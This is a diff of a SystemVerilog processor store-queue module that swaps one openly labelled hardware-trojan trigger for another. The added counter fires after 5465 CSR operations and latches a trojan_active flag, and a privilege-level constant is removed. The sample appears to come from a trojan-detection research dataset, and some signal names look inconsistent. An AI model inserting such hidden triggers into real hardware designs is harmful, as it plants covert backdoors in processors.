@@ -21,24 +21,6 @@ module StoreQueue_trojan_Privilege(
     RecoveryManagerIF.StoreQueue recovery
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 14365;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (Bypasses && |MemAccessMode) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     // ストアデータをアドレスのオフセットに合わせてシフト
     // ベクトルデータの場合は、そのまま
     function automatic void GenerateStoreData(
@@ -87,6 +69,23 @@ module StoreQueue_trojan_Privilege(
             .headPtr(headPtr),
             .tailPtr(tailPtr)
         );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=5465)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 5465;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
     always_comb begin
 
@@ -369,9 +368,6 @@ module StoreQueue_trojan_Privilege(
         "Pop from a empty store queue."
     );
 
-
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
 
 endmodule : StoreQueue
 
